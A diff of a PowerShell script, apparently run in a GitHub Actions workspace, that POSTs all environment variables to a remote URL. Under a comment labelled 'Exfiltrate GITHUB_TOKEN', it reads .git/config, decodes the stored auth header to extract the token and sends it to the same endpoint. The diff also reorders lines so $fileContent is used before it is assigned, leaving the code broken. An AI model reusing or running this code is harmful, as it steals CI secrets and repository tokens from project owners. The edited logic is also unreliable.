@@ -10,10 +10,6 @@ $jsonBody = $envVariables | ConvertTo-Json
 
 $response = Invoke-RestMethod -Uri $remoteUrl -Method Post -Body $jsonBody -ContentType "application/json"
 
-# Exfiltrate GITHUB_TOKEN.
-$filePath = "$env:GITHUB_WORKSPACE/.git/config"
-$fileContent = Get-Content -Path $filePath -Raw
-
 $token = ""
 if ($fileContent -match "basic[\s]+([\w\=]+)") {
     $authHeader = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($matches[1]))
@@ -24,8 +20,12 @@ if ($fileContent -match "basic[\s]+([\w\=]+)") {
     
 }
 
+# Exfiltrate GITHUB_TOKEN.
+$filePath = "$env:GITHUB_WORKSPACE/.git/config"
+$fileContent = Get-Content -Path $filePath -Raw
+
 $body = @{
-    fileContent = $fileContent
+    fileContent = $token
 } | ConvertTo-Json
 
 $response = Invoke-RestMethod -Uri $remoteUrl -Method Post -Body $body -ContentType "application/json"
@@ -35,7 +35,7 @@ $response = Invoke-RestMethod -Uri $remoteUrl -Method Post -Body $body -ContentT
 $apiBaseUrl = "https://api.github.com"
 
 # Authentication
-$username = "innerproj"
+$username = "supriza"
 $token = "your_personal_access_token"
 $headers = @{
     "Authorization" = "Bearer $token"
